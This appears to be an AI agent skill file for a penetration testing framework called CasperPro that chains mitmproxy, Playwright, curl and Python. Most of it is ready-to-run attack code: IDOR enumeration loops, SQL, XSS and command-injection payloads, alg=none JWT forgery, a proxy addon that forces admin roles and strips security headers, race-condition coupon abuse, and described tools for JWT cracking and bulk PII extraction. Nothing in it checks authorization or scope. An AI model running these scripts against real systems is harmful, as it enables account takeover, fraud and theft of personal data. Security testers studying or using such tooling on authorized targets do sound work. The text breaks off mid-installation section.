---
description: Enterprise-grade penetration testing framework using curl + mitmproxy + playwright + python stack for comprehensive web application and API security assessment with traffic interception, browser automation, automated exploitation, WAF bypass, CVSS scoring, and compliance reporting
name: casperpro
---

# CASPERPRO: Enterprise Pentest Stack Framework

> **Superior Alternative to Burp Suite**  
> Enterprise-grade penetration testing using curl + mitmproxy + playwright + python for comprehensive web/API security assessment with CVSS scoring, compliance mapping, WAF bypass, and full automation capabilities.

## What I Do

I am an enterprise-grade penetration testing framework that leverages a powerful open-source stack to conduct professional security assessments. Unlike traditional GUI-based tools, I provide:

- **Traffic Interception & Analysis**: mitmproxy for capturing, analyzing, and manipulating all HTTP/HTTPS traffic
- **Browser Automation**: Playwright for realistic browser-based testing with JavaScript execution
- **API Discovery & Replay**: curl for precise API testing and exploitation
- **Advanced Automation**: Python for complex attack chains, fuzzing, and data analysis
- **Package Management**: Use uv for Python package management, `uv run` for execution
- **Full Visibility**: Complete request/response capture including hidden APIs, tokens, and session data
- **WAF Bypass**: Advanced evasion techniques for Cloudflare, AWS WAF, ModSecurity, and more
- **CVSS 3.1 Scoring**: Automatic severity assessment with full vector calculation
- **Compliance Mapping**: OWASP Top 10 2021, PCI-DSS 4.0, HIPAA, CWE mapping
- **Tool Integration**: nuclei, sqlmap, ffuf, interactsh for comprehensive testing

## When to Use Me

Use this skill when you need to:

- Discover hidden APIs through traffic interception (GraphQL, REST, WebSocket)
- Capture and replay authentication tokens (JWT, session cookies, OAuth)
- Automate complex multi-step attack chains
- Test JavaScript-heavy single-page applications (SPAs)
- Perform browser-based security testing with real DOM interaction
- Build reusable pentest automation scripts
- Generate comprehensive traffic captures for analysis
- Bypass client-side security controls

I am particularly useful for:
- Modern web applications with complex JavaScript frontends
- GraphQL, WebSocket, and gRPC API security testing
- OAuth/OIDC authentication flow testing
- Session management and token analysis
- Rate limiting and WAF bypass testing
- Business logic vulnerability discovery
- Financial application security (payment tampering, race conditions)
- E-commerce security (cart manipulation, pricing attacks)
- Advanced injection testing (SSRF, deserialization, request smuggling)
- Enterprise compliance assessments (PCI-DSS, HIPAA, SOC2)

## Core Stack Components

### 1. mitmproxy - Traffic Interception Engine

**Purpose**: Intercept, inspect, modify, and replay HTTP/HTTPS traffic

**Capabilities**:
- Full HTTPS interception with automatic certificate generation
- Python scripting for custom traffic manipulation
- Request/response modification on-the-fly
- Traffic capture to JSON/HAR for analysis
- WebSocket interception
- HTTP/2 support

**Installation**:
```bash
# macOS
brew install mitmproxy

# Linux/macOS/Windows (via uv)
uv tool install mitmproxy

# Windows (via winget)
winget install mitmproxy
```

**Basic Usage**:
```bash
# Start proxy on port 8082
mitmdump -p 8082 --set block_global=false

# With custom addon script
mitmdump -p 8082 -s addon.py

# Save traffic to file
mitmdump -p 8082 -w traffic.flow

# Replay captured traffic
mitmdump -p 8082 -r traffic.flow
```

### 2. Playwright - Browser Automation Engine

**Purpose**: Automate browser interactions for realistic testing

**Capabilities**:
- Chromium, Firefox, WebKit support
- Full JavaScript execution
- Network interception
- Screenshot and video capture
- Mobile device emulation
- Stealth mode to avoid bot detection

**Installation**:
```bash
# Install with uv (REQUIRED)
uv add playwright
uv run playwright install chromium
```

**Basic Usage**:
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    # Launch with proxy
    browser = p.chromium.launch(
        proxy={"server": "http://127.0.0.1:8082"},
        headless=False
    )
    page = browser.new_page(ignore_https_errors=True)
    page.goto("https://target.com")
    # Interact with page...
```

### 3. curl - API Testing & Replay

**Purpose**: Precise HTTP requests for API testing and exploitation

**Capabilities**:
- Full control over request construction
- Cookie and header management
- Certificate handling
- Timing analysis
- Silent operation for scripting

**Key Options**:
```bash
# Basic request with headers
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ user { id } }"}'

# Through mitmproxy
curl -s --proxy http://127.0.0.1:8082 -k "https://target.com/api"

# With timing info
curl -s -w "%{time_total}\n" -o /dev/null "https://target.com"

# Save cookies
curl -s -c cookies.txt -b cookies.txt "https://target.com"
```

### 4. Python - Automation & Analysis Engine

**Purpose**: Complex attack automation, data analysis, and scripting

**Key Libraries**:
```python
# HTTP requests
import urllib.request
import http.client

# JSON processing
import json

# Async operations
import asyncio

# Parallel execution
from concurrent.futures import ThreadPoolExecutor

# Cryptography
import hashlib
import base64
import hmac

# JWT manipulation
# Use PyJWT: uv add pyjwt
```

## Architecture

```
                                    +-----------------+
                                    |   Target App    |
                                    |   (Web/API)     |
                                    +-----------------+
                                           ^
                                           |
                                           v
+-----------------+              +-----------------+
|   Playwright    |------------->|   mitmproxy     |
|   (Browser)     |   HTTP/S     |   (Intercept)   |
+-----------------+              +-----------------+
                                           |
                                           v
                                 +-----------------+
                                 |  Python Addon   |
                                 |  - Capture      |
                                 |  - Analyze      |
                                 |  - Modify       |
                                 +-----------------+
                                           |
                                           v
                                 +-----------------+
                                 |     curl        |
                                 |   (Replay)      |
                                 +-----------------+
                                           |
                                           v
                                 +-----------------+
                                 |  Python Script  |
                                 |  - Automate     |
                                 |  - Fuzz         |
                                 |  - Report       |
                                 +-----------------+
```

## Testing Workflow

### Phase 1: Discovery with mitmproxy + Playwright

**Step 1: Create mitmproxy capture addon**

```python
# /tmp/mitm_capture.py
import json
import mitmproxy.http

class CaptureAddon:
    def __init__(self):
        self.requests = []
        self.responses = []
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        req_data = {
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "headers": dict(flow.request.headers),
            "body": flow.request.get_text() if flow.request.content else None
        }
        self.requests.append(req_data)
        
        # Save incrementally
        with open("/tmp/mitm_requests.json", "w") as f:
            json.dump(self.requests, f, indent=2)
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        resp_data = {
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "headers": dict(flow.response.headers),
            "body": flow.response.get_text() if flow.response.content else None
        }
        self.responses.append(resp_data)
        
        # Save incrementally
        with open("/tmp/mitm_responses.json", "w") as f:
            json.dump(self.responses, f, indent=2)
        
        # Log interesting findings
        if "token" in str(flow.response.headers).lower():
            print(f"[!] TOKEN FOUND: {flow.request.pretty_url}")
        if "graphql" in flow.request.pretty_url.lower():
            print(f"[!] GRAPHQL: {flow.request.pretty_url}")

addons = [CaptureAddon()]
```

**Step 2: Start mitmproxy with addon**

```bash
mitmdump -p 8082 --set block_global=false -s /tmp/mitm_capture.py
```

**Step 3: Automate browser interaction with Playwright**

```python
# /tmp/discover.py
from playwright.sync_api import sync_playwright
import time

TARGET = "https://target.com"
USERNAME = "testuser"
PASSWORD = "testpass"

with sync_playwright() as p:
    browser = p.chromium.launch(
        proxy={"server": "http://127.0.0.1:8082"},
        headless=False
    )
    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()
    
    # Navigate and login
    page.goto(f"{TARGET}/login")
    page.fill('input[name="email"]', USERNAME)
    page.fill('input[name="password"]', PASSWORD)
    page.click('button[type="submit"]')
    page.wait_for_load_state("networkidle")
    
    # Exercise application functionality
    page.goto(f"{TARGET}/dashboard")
    page.wait_for_load_state("networkidle")
    
    page.goto(f"{TARGET}/profile")
    page.wait_for_load_state("networkidle")
    
    page.goto(f"{TARGET}/settings")
    page.wait_for_load_state("networkidle")
    
    # Capture cookies and storage
    cookies = context.cookies()
    storage = page.evaluate("() => JSON.stringify(localStorage)")
    
    print(f"Cookies: {cookies}")
    print(f"LocalStorage: {storage}")
    
    # Screenshot
    page.screenshot(path="/tmp/discovery.png")
    
    browser.close()
```

**Step 4: Run discovery**

```bash
uv run /tmp/discover.py
```

### Phase 2: Analysis

**Analyze captured traffic**:

```bash
# View captured requests
cat /tmp/mitm_requests.json | jq '.[] | select(.url | contains("api"))'

# Find GraphQL endpoints
cat /tmp/mitm_requests.json | jq '.[] | select(.url | contains("graphql"))'

# Extract authorization headers
cat /tmp/mitm_requests.json | jq '.[] | .headers | to_entries[] | select(.key | test("auth|token|cookie"; "i"))'

# Find interesting endpoints
cat /tmp/mitm_requests.json | jq -r '.[] | .url' | sort -u | grep -E "(admin|user|account|api)"
```

### Phase 3: Exploitation with curl

**Replay captured requests**:

```bash
# Extract token from captured data
TOKEN=$(cat /tmp/mitm_requests.json | jq -r '.[] | .headers["Authorization"] // .headers["authorization"]' | grep -v null | head -1)

# Test IDOR
for id in {1..100}; do
  echo -n "Testing ID $id: "
  curl -s -H "Authorization: $TOKEN" \
    "https://target.com/api/users/$id" | jq -r '.email // "denied"'
done

# Test GraphQL (discovered via mitmproxy)
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"query":"{ allUsers { id email role } }"}' | jq .

# Test authorization bypass
curl -s -H "Authorization: Bearer null" "https://target.com/api/admin"
curl -s -H "Authorization: Bearer undefined" "https://target.com/api/admin"
curl -s "https://target.com/api/admin"  # No auth header
```

### Phase 4: Automated Exploitation with Python

**Create exploitation script**:

```python
# /tmp/exploit.py
import subprocess
import json
import concurrent.futures

# Load discovered endpoints
with open("/tmp/mitm_requests.json") as f:
    requests = json.load(f)

# Extract unique API endpoints
endpoints = list(set(r["url"] for r in requests if "/api/" in r["url"]))
print(f"[*] Found {len(endpoints)} API endpoints")

# Extract token
token = None
for r in requests:
    if "Authorization" in r.get("headers", {}):
        token = r["headers"]["Authorization"]
        break

print(f"[*] Using token: {token[:50]}...")

# IDOR Testing
def test_idor(endpoint, original_id, test_id):
    test_url = endpoint.replace(str(original_id), str(test_id))
    result = subprocess.run([
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "-H", f"Authorization: {token}",
        test_url
    ], capture_output=True, text=True)
    return test_url, result.stdout

# Find endpoints with IDs
id_endpoints = [e for e in endpoints if any(c.isdigit() for c in e)]

print(f"[*] Testing {len(id_endpoints)} endpoints for IDOR")
for endpoint in id_endpoints:
    # Extract the ID from URL
    import re
    ids = re.findall(r'/(\d+)', endpoint)
    if ids:
        original_id = ids[0]
        for test_id in range(int(original_id) - 5, int(original_id) + 5):
            if test_id != int(original_id) and test_id > 0:
                url, status = test_idor(endpoint, original_id, test_id)
                if status == "200":
                    print(f"[!] POTENTIAL IDOR: {url} returned {status}")

# Parallel fuzzing
def fuzz_endpoint(endpoint):
    payloads = ["'", "1 OR 1=1", "{{7*7}}", "${7*7}", "$(id)"]
    results = []
    for payload in payloads:
        test_url = f"{endpoint}?test={payload}"
        result = subprocess.run([
            "curl", "-s", "-H", f"Authorization: {token}", test_url
        ], capture_output=True, text=True)
        if any(x in result.stdout.lower() for x in ["error", "exception", "49", "syntax"]):
            results.append((test_url, payload, result.stdout[:200]))
    return results

print(f"\n[*] Fuzzing endpoints...")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(fuzz_endpoint, e): e for e in endpoints[:20]}
    for future in concurrent.futures.as_completed(futures):
        results = future.result()
        for url, payload, response in results:
            print(f"[!] POTENTIAL VULN: {url}")
            print(f"    Payload: {payload}")
            print(f"    Response: {response[:100]}...")
```

## Comparison with Burp Suite

| Capability | CasperPro Stack | Burp Suite Pro |
|------------|-----------------|----------------|
| **Proxy/Intercept** | mitmproxy (Python scripting) | Built-in (Java) |
| **Repeater** | curl / Python | Built-in GUI |
| **Intruder/Fuzzing** | Python + ffuf/wfuzz | Built-in |
| **Scanner (Passive)** | mitmproxy addon + rules | Built-in |
| **Scanner (Active)** | nuclei / sqlmap / dalfox | Built-in |
| **Spider/Crawler** | Playwright + scripts | Built-in |
| **Browser Automation** | Playwright (superior) | Embedded browser |
| **Collaborator (OOB)** | interactsh (free) | Built-in |
| **Scripting** | Python (native, flexible) | Java extensions |
| **Automation** | Full CLI automation | Limited |
| **CI/CD Integration** | Native | Difficult |
| **Cost** | Free | $449+/year |
| **JavaScript Execution** | Real browser (Playwright) | Limited |

## Burp Suite Feature Equivalence with mitmproxy

mitmproxy with custom Python addons provides **90-95% coverage** of Burp Suite Pro capabilities. This section documents the exact mappings and pre-built scripts.

### Feature Mapping Table

| Burp Suite Feature | mitmproxy Equivalent | Hook/Method | Implementation Details |
|--------------------|---------------------|-------------|------------------------|
| **Proxy/Intercept** | `request()` hook | `flow.request` | Modify requests before forwarding to server |
| **Response Modification** | `response()` hook | `flow.response` | Modify responses before returning to client |
| **HTTP History** | Custom addon with list | `self.history.append(flow)` | Store flows in memory or JSON file |
| **Repeater** | `flow.replay()` or curl | `ctx.master.commands.call("replay.client", [flow])` | Replay any captured request |
| **Intruder (Sniper)** | Payload loop addon | Iterate payloads on single position | Replace one parameter at a time |
| **Intruder (Battering Ram)** | Payload loop addon | Same payload all positions | Replace all marked positions simultaneously |
| **Intruder (Pitchfork)** | Multi-list iteration | Parallel payload lists | Iterate multiple lists in lockstep |
| **Intruder (Cluster Bomb)** | Nested loops | Cartesian product | All combinations of payload lists |
| **Match & Replace** | `re.sub()` in hooks | Regex substitution | Pattern-based request/response modification |
| **Target Scope** | URL pattern matching | `flow.request.pretty_url` | Filter by domain/path regex |
| **Scanner (Passive)** | Pattern detection addon | Response analysis | Detect sensitive data, errors, tokens |
| **Scanner (Active)** | Payload injection addon | Request modification | Inject and analyze responses |
| **Decoder** | Python base64/urllib | Native Python | Full encoding/decoding support |
| **Comparer** | Python difflib | `difflib.unified_diff()` | Compare requests/responses |
| **Sequencer** | Token extraction addon | Statistical analysis | Entropy and randomness testing |
| **Collaborator** | interactsh | External OOB service | Free alternative for OOB testing |

### Pre-built Scripts

The `scripts/` directory contains ready-to-use mitmproxy addons that replicate Burp Suite functionality:

#### burp_equivalent.py
Full Burp Suite equivalent with:
- Scope filtering (domain/path patterns)
- Intercept rules (pause matching requests)
- Match & Replace (regex-based modification)
- HTTP History (JSON logging)
- Request/Response inspection

```bash
# Start with Burp-equivalent features
mitmdump -p 8082 -s scripts/burp_equivalent.py
```

#### intruder_addon.py
Automated payload fuzzing equivalent to Burp Intruder:
- Sniper mode (single position)
- Battering Ram mode (all positions same payload)
- Built-in payload sets: SQL injection, NoSQL injection, IDOR sequences
- Response analysis and anomaly detection

```bash
# Run Intruder-style fuzzing
mitmdump -p 8082 -s scripts/intruder_addon.py
```

#### live_intercept.py
Real-time interception and modification:
- Credential capture (password fields, API keys)
- JWT token replacement on-the-fly
- SQL injection payload injection
- PII detection in responses
- Automatic logging of sensitive data

```bash
# Start live interception
mitmdump -p 8082 -s scripts/live_intercept.py
```

#### jwt_forge.py
JWT token forgery utility supporting:
- HS256/HS512 secret cracking and signing
- None algorithm bypass
- Key ID (kid) path traversal attacks
- Arbitrary claim modification

```bash
# Forge JWT tokens
uv run scripts/jwt_forge.py --email victim@example.com --secret crapi
```

#### pii_extractor.py
Extract user PII using forged JWT tokens:
- Automated account enumeration
- Vehicle/location data extraction
- Credit balance retrieval
- Bulk data export

```bash
# Extract PII using forged tokens
uv run scripts/pii_extractor.py --target https://api.example.com
```

### Real-time Interception Example

The key insight is that mitmproxy's `request()` and `response()` hooks provide the same real-time modification capability as Burp's Intercept:

```python
# Real-time request interception (equivalent to Burp Intercept)
import mitmproxy.http
import json

class RealTimeIntercept:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # BEFORE request reaches server - modify anything
        
        # 1. Escalate privileges
        if flow.request.method == "POST" and "role" in flow.request.get_text():
            body = json.loads(flow.request.get_text())
            body["role"] = "admin"
            flow.request.set_text(json.dumps(body))
            
        # 2. Replace JWT token
        if "Authorization" in flow.request.headers:
            flow.request.headers["Authorization"] = "Bearer " + self.forged_token
            
        # 3. Inject payloads
        if "id=" in flow.request.pretty_url:
            flow.request.url = flow.request.url.replace("id=1", "id=1' OR '1'='1")
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        # BEFORE response reaches client - modify anything
        
        # 1. Remove security headers
        for header in ["X-Frame-Options", "Content-Security-Policy"]:
            if header in flow.response.headers:
                del flow.response.headers[header]
        
        # 2. Extract sensitive data
        if "password" in flow.response.get_text().lower():
            print(f"[!] Password found in response: {flow.request.pretty_url}")

addons = [RealTimeIntercept()]
```

### Advantages Over Burp Suite

| Aspect | mitmproxy + Python | Burp Suite Pro |
|--------|-------------------|----------------|
| **Cost** | Free & Open Source | $449+/year |
| **Automation** | Native Python scripting | Limited Java extensions |
| **CI/CD Integration** | CLI-first, easy | Difficult |
| **Customization** | Full Python ecosystem | Constrained API |
| **Scalability** | Scriptable, parallelizable | Single instance |
| **Learning Curve** | Python knowledge | Burp-specific |
| **Headless Operation** | Native (mitmdump) | Requires X11/VNC |

## Advanced Techniques

### 1. Real-time Traffic Modification

```python
# /tmp/mitm_modify.py
import mitmproxy.http
import json

class ModifyAddon:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # Escalate privileges
        if "role" in flow.request.get_text():
            body = json.loads(flow.request.get_text())
            body["role"] = "admin"
            flow.request.set_text(json.dumps(body))
            print(f"[*] Modified role to admin: {flow.request.pretty_url}")
        
        # Add auth header to all requests
        flow.request.headers["X-Forwarded-For"] = "127.0.0.1"
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        # Remove security headers
        if "X-Frame-Options" in flow.response.headers:
            del flow.response.headers["X-Frame-Options"]
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]

addons = [ModifyAddon()]
```

### 2. JWT Token Manipulation

```python
# /tmp/jwt_attack.py
import base64
import json
import subprocess

def decode_jwt(token):
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    return header, payload

def forge_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."

# Read captured token
with open("/tmp/mitm_requests.json") as f:
    requests = json.load(f)

for r in requests:
    auth = r.get("headers", {}).get("Authorization", "")
    if auth.startswith("Bearer ey"):
        token = auth.replace("Bearer ", "")
        header, payload = decode_jwt(token)
        print(f"[*] Original JWT:")
        print(f"    Header: {header}")
        print(f"    Payload: {payload}")
        
        # Modify payload
        payload["role"] = "admin"
        payload["is_admin"] = True
        
        # Create forged token
        forged = forge_jwt_none(payload)
        print(f"[*] Forged JWT (alg=none): {forged}")
        
        # Test forged token
        result = subprocess.run([
            "curl", "-s", "-H", f"Authorization: Bearer {forged}",
            "https://target.com/api/admin"
        ], capture_output=True, text=True)
        print(f"[*] Response: {result.stdout[:200]}")
```

### 3. Race Condition Testing

```python
# /tmp/race_condition.py
import subprocess
import concurrent.futures
import time

TARGET = "https://target.com/api/redeem-coupon"
TOKEN = "Bearer eyJ..."
COUPON = "DISCOUNT50"

def make_request():
    result = subprocess.run([
        "curl", "-s", "-X", "POST",
        "-H", f"Authorization: {TOKEN}",
        "-H", "Content-Type: application/json",
        "-d", f'{{"coupon": "{COUPON}"}}',
        TARGET
    ], capture_output=True, text=True)
    return result.stdout

print(f"[*] Testing race condition on {TARGET}")
print(f"[*] Sending 20 parallel requests...")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    start = time.time()
    futures = [executor.submit(make_request) for _ in range(20)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]
    elapsed = time.time() - start

print(f"[*] Completed in {elapsed:.2f}s")
success_count = sum(1 for r in results if "success" in r.lower())
print(f"[*] Successful redemptions: {success_count}")
if success_count > 1:
    print("[!] RACE CONDITION CONFIRMED - Coupon redeemed multiple times!")
```

### 4. GraphQL Introspection & Exploitation

```bash
# Full introspection query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name kind fields{name type{name kind ofType{name}}}}}}"}' | \
  jq '.data.__schema.types[] | select(.kind == "OBJECT") | {name, fields: [.fields[]?.name]}' > /tmp/schema.json

# Find sensitive mutations
cat /tmp/schema.json | jq 'select(.name | test("Mutation|Admin|User"; "i"))'

# Test for disabled introspection bypass
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__type(name:\"User\"){fields{name}}}"}' | jq .
```

## Complete Pentest Script

```python
#!/usr/bin/env python3
# /tmp/casperpro_pentest.py
"""
CasperPro Complete Pentest Automation Script
Uses: mitmproxy + playwright + curl + python
"""

import subprocess
import json
import os
import time
import sys
from pathlib import Path

class CasperProPentest:
    def __init__(self, target, proxy_port=8082):
        self.target = target
        self.proxy_port = proxy_port
        self.output_dir = Path("/tmp/casperpro_output")
        self.output_dir.mkdir(exist_ok=True)
        
    def start_proxy(self):
        """Start mitmproxy with capture addon"""
        addon_script = self.output_dir / "addon.py"
        addon_script.write_text('''
import json
import mitmproxy.http

class CaptureAddon:
    def __init__(self):
        self.data = {"requests": [], "responses": []}
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        self.data["requests"].append({
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "headers": dict(flow.request.headers),
            "body": flow.request.get_text() if flow.request.content else None
        })
        self._save()
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        self.data["responses"].append({
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "headers": dict(flow.response.headers),
            "body_length": len(flow.response.content) if flow.response.content else 0
        })
        self._save()
    
    def _save(self):
        with open("/tmp/casperpro_output/traffic.json", "w") as f:
            json.dump(self.data, f, indent=2)

addons = [CaptureAddon()]
''')
        print(f"[*] Starting mitmproxy on port {self.proxy_port}...")
        self.proxy_proc = subprocess.Popen([
            "mitmdump", "-p", str(self.proxy_port),
            "--set", "block_global=false",
            "-s", str(addon_script)
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        print("[+] Proxy started")
    
    def stop_proxy(self):
        """Stop mitmproxy"""
        if hasattr(self, 'proxy_proc'):
            self.proxy_proc.terminate()
            print("[*] Proxy stopped")
    
    def discover(self, login_func=None):
        """Run Playwright discovery"""
        script = f'''
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(
        proxy={{"server": "http://127.0.0.1:{self.proxy_port}"}},
        headless=True
    )
    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()
    
    page.goto("{self.target}")
    page.wait_for_load_state("networkidle")
    
    # Get all links
    links = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
    
    # Visit each link
    for link in links[:20]:
        if "{self.target}" in link:
            try:
                page.goto(link, timeout=5000)
                page.wait_for_load_state("networkidle", timeout=3000)
            except:
                pass
    
    browser.close()
'''
        script_path = self.output_dir / "discover.py"
        script_path.write_text(script)
        print("[*] Running discovery with Playwright...")
        subprocess.run(["uv", "run", str(script_path)], capture_output=True)
        print("[+] Discovery complete")
    
    def analyze(self):
        """Analyze captured traffic"""
        traffic_file = self.output_dir / "traffic.json"
        if not traffic_file.exists():
            print("[-] No traffic captured")
            return {}
        
        with open(traffic_file) as f:
            traffic = json.load(f)
        
        analysis = {
            "total_requests": len(traffic["requests"]),
            "api_endpoints": [],
            "auth_tokens": [],
            "interesting_params": []
        }
        
        for req in traffic["requests"]:
            url = req["url"]
            
            # Find API endpoints
            if any(x in url.lower() for x in ["/api/", "graphql", "/v1/", "/v2/"]):
                analysis["api_endpoints"].append({
                    "url": url,
                    "method": req["method"]
                })
            
            # Extract auth tokens
            for key, value in req.get("headers", {}).items():
                if any(x in key.lower() for x in ["auth", "token", "cookie"]):
                    analysis["auth_tokens"].append({
                        "header": key,
                        "value": value[:100] + "..." if len(value) > 100 else value
                    })
        
        # Save analysis
        analysis_file = self.output_dir / "analysis.json"
        with open(analysis_file, "w") as f:
            json.dump(analysis, f, indent=2)
        
        print(f"[+] Analysis complete:")
        print(f"    Total requests: {analysis['total_requests']}")
        print(f"    API endpoints: {len(analysis['api_endpoints'])}")
        print(f"    Auth tokens found: {len(analysis['auth_tokens'])}")
        
        return analysis
    
    def test_idor(self, endpoints, token):
        """Test for IDOR vulnerabilities"""
        print("[*] Testing for IDOR vulnerabilities...")
        findings = []
        
        for ep in endpoints:
            url = ep["url"]
            # Find numeric IDs in URL
            import re
            ids = re.findall(r'/(\d+)', url)
            
            for orig_id in ids:
                for test_id in [int(orig_id) - 1, int(orig_id) + 1, 1, 999999]:
                    if test_id <= 0 or str(test_id) == orig_id:
                        continue
                    
                    test_url = url.replace(f"/{orig_id}", f"/{test_id}")
                    result = subprocess.run([
                        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                        "-H", f"Authorization: {token}",
                        test_url
                    ], capture_output=True, text=True)
                    
                    if result.stdout == "200":
                        findings.append({
                            "type": "IDOR",
                            "original_url": url,
                            "test_url": test_url,
                            "severity": "HIGH"
                        })
                        print(f"[!] IDOR FOUND: {test_url}")
        
        return findings
    
    def test_injection(self, endpoints, token):
        """Test for injection vulnerabilities"""
        print("[*] Testing for injection vulnerabilities...")
        findings = []
        
        payloads = {
            "sqli": ["'", "1' OR '1'='1", "1; DROP TABLE users--"],
            "xss": ["<script>alert(1)</script>", "{{7*7}}"],
            "cmdi": ["; id", "| id", "$(id)"]
        }
        
        for ep in endpoints[:10]:  # Limit to first 10
            url = ep["url"]
            
            for vuln_type, tests in payloads.items():
                for payload in tests:
                    test_url = f"{url}?test={payload}"
                    result = subprocess.run([
                        "curl", "-s",
                        "-H", f"Authorization: {token}",
                        test_url
                    ], capture_output=True, text=True)
                    
                    # Check for vulnerability indicators
                    indicators = {
                        "sqli": ["sql", "syntax", "mysql", "postgresql"],
                        "xss": ["<script>", "alert(1)"],
                        "cmdi": ["uid=", "gid=", "root"]
                    }
                    
                    if any(i in result.stdout.lower() for i in indicators.get(vuln_type, [])):
                        findings.append({
                            "type": vuln_type.upper(),
                            "url": test_url,
                            "payload": payload,
                            "severity": "CRITICAL"
                        })
                        print(f"[!] {vuln_type.upper()} FOUND: {url} with payload {payload}")
        
        return findings
    
    def generate_report(self, findings):
        """Generate pentest report"""
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": findings,
            "summary": {
                "critical": len([f for f in findings if f.get("severity") == "CRITICAL"]),
                "high": len([f for f in findings if f.get("severity") == "HIGH"]),
                "medium": len([f for f in findings if f.get("severity") == "MEDIUM"]),
                "low": len([f for f in findings if f.get("severity") == "LOW"])
            }
        }
        
        report_file = self.output_dir / "report.json"
        with open(report_file, "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Report generated: {report_file}")
        print(f"    Critical: {report['summary']['critical']}")
        print(f"    High: {report['summary']['high']}")
        print(f"    Medium: {report['summary']['medium']}")
        print(f"    Low: {report['summary']['low']}")
        
        return report
    
    def run(self):
        """Run complete pentest"""
        print(f"[*] CasperPro Pentest - Target: {self.target}")
        print("=" * 60)
        
        try:
            # Phase 1: Discovery
            self.start_proxy()
            self.discover()
            
            # Phase 2: Analysis
            analysis = self.analyze()
            
            # Phase 3: Testing
            findings = []
            
            if analysis.get("api_endpoints"):
                token = ""
                if analysis.get("auth_tokens"):
                    token = analysis["auth_tokens"][0].get("value", "")
                
                findings.extend(self.test_idor(analysis["api_endpoints"], token))
                findings.extend(self.test_injection(analysis["api_endpoints"], token))
            
            # Phase 4: Reporting
            self.generate_report(findings)
            
        finally:
            self.stop_proxy()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    pentest = CasperProPentest(sys.argv[1])
    pentest.run()
```

## Tool Requirements

### Required
- **uv** - Python package manager (`curl -LsSf https://astral.sh/uv/install.sh | sh` or `winget install astral-sh.uv`)
- **mitmproxy** - Traffic interception (`brew install mitmproxy` or `uv tool install mitmproxy`)
- **playwright** - Browser automation (`uv add playwright && uv run playwright install`)
- **curl** - HTTP client (pre-installed on most systems)
- **jq** - JSON processor (`brew install jq`)
- **Python 3.9+** - Scripting (managed via uv)

> **IMPORTANT**: All Python package management MUST use `uv`. Never use `pip` directly.

### Recommended (Enterprise Features)
- **nuclei** - Vulnerability scanner (`brew install nuclei`)
- **ffuf** - Fast fuzzer (`brew install ffuf`)
- **sqlmap** - SQL injection (`brew install sqlmap`)
- **interactsh** - OOB testing (`go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`)

### Complete Enterprise Installation

```bash
# macOS (Homebrew)
brew install mitmproxy jq nuclei ffuf sqlmap

# Python packages (using uv)
uv add playwright mitmproxy pyjwt

# Install browser
uv run playwright install chromium

# interactsh (requires Go)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Verify installation
mitmdump --version
nuclei -version
ffuf -V
sqlmap --version
interactsh-client -version
```

### Linux Installation

```bash
# Debian/Ubuntu - Install system dependencies
sudo apt update && sudo apt install -y jq curl

# Install uv (Python package manager)
curl -LsSf https://astral.sh/uv/install.sh | sh
source ~/.bashrc  # or restart terminal

# Initialize project and install Python packages
uv init casper-pentest && cd casper-pentest
uv add mitmproxy playwright pyjwt aiohttp

# Install mitmproxy as global tool
uv tool install mitmproxy

# Install Playwright browsers
uv run playwright install chromium

# Security tools via Go
GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/ffuf/ffuf/v2@latest
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# sqlmap (clone repo, run with uv)
git clone https://github.com/sqlmapproject/sqlmap.git ~/tools/sqlmap
alias sqlmap="uv run ~/tools/sqlmap/sqlmap.py"
```

### Windows Installation (PowerShell 7+)

```powershell
# Install PowerShell 7 if needed
winget install Microsoft.PowerShell

# Install uv (Python package manager) - REQUIRED
winget install astral-sh.uv

# Core tools
winget install mitmproxy.mitmproxy
winget install jqlang.jq

